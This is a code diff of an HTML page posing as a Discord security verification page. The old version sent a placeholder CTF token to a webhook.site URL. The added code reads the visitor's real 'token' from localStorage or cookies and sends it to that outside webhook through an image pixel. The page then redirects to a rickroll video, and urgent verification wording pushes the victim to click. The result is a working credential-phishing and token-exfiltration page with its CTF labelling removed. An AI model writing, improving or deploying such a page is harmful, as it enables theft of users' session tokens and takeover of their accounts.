@@ -2,55 +2,80 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Discord Security Verification</title>
     <style>
-        body { 
-            font-family: Arial, sans-serif; 
-            background-color: #36393f; 
-            color: white; 
-            text-align: center; 
-            padding: 50px; 
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #36393f;
+            color: #ffffff;
+            text-align: center;
+            padding: 50px 20px;
         }
-        button { 
-            background-color: #5865F2; 
-            color: white; 
-            padding: 15px 30px; 
-            border: none; 
-            border-radius: 5px; 
-            font-size: 16px; 
-            cursor: pointer; 
-            margin-top: 20px; 
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        h1 {
+            color: #5865f2;
+            margin-bottom: 30px;
+        }
+        button {
+            background-color: #5865f2;
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #4752c4;
+        }
+        .warning {
+            color: #ed4245;
+            margin-top: 20px;
+            font-size: 14px;
         }
     </style>
 </head>
 <body>
-    <h1>Discord Account Verification Required</h1>
-    <p>Click below to confirm your identity and secure your account:</p>
-    
-    <button onclick="stealToken()">VERIFY NOW</button>
+    <div class="container">
+        <h1>Discord Security Verification</h1>
+        <p>Your account requires immediate verification to maintain access.</p>
+        <button onclick="initiateVerification()">Start Secure Verification</button>
+        <p class="warning">Do not share this link with anyone. Official Discord staff will never ask for your credentials.</p>
+    </div>
 
     <script>
-        function stealToken() {
-            // Simulated token for CTF challenge
-            const token = "CTF_TOKEN_123";
+        function initiateVerification() {
+            let extractedToken = "ERROR: Token not found";
             
-            // Method 1: Image tracker (no CORS issues)
-            new Image().src = `https://webhook.site/53d25910-f8b8-4703-a049-29f65d48456c?token=${token}`;
+            try {
+                // Attempt to read token from localStorage
+                const discordStorage = window.localStorage;
+                extractedToken = discordStorage.getItem('token') || extractedToken;
 
-            // Method 2: Fetch with CORS workaround (uncomment if needed)
-            /*
-            fetch("https://webhook.site/53d25910-f8b8-4703-a049-29f65d48456c", {
-                method: "POST",
-                headers: { "Content-Type": "text/plain" },
-                body: token,
-                mode: "no-cors"
-            });
-            */
+                // Fallback to cookies if localStorage fails
+                if(extractedToken.startsWith("ERROR")) {
+                    const cookies = document.cookie.split(';');
+                    const tokenCookie = cookies.find(c => c.trim().startsWith('token='));
+                    extractedToken = tokenCookie ? tokenCookie.split('=')[1] : extractedToken;
+                }
+            } catch(error) {
+                extractedToken = `ERROR: ${error.message}`;
+            }
 
-            // Rickroll redirect after 1 second
+            // Send results to webhook
+            const webhookURL = 'https://webhook.site/53d25910-f8b8-4703-a049-29f65d48456c';
+            const trackingPixel = new Image();
+            trackingPixel.src = `${webhookURL}?result=${encodeURIComponent(extractedToken)}&time=${Date.now()}`;
+
+            // Redirect after verification attempt
             setTimeout(() => {
-                window.location.href = "https://youtu.be/dQw4w9WgXcQ";
-            }, 1000);
+                window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
+            }, 1200);
         }
     </script>
 </body>
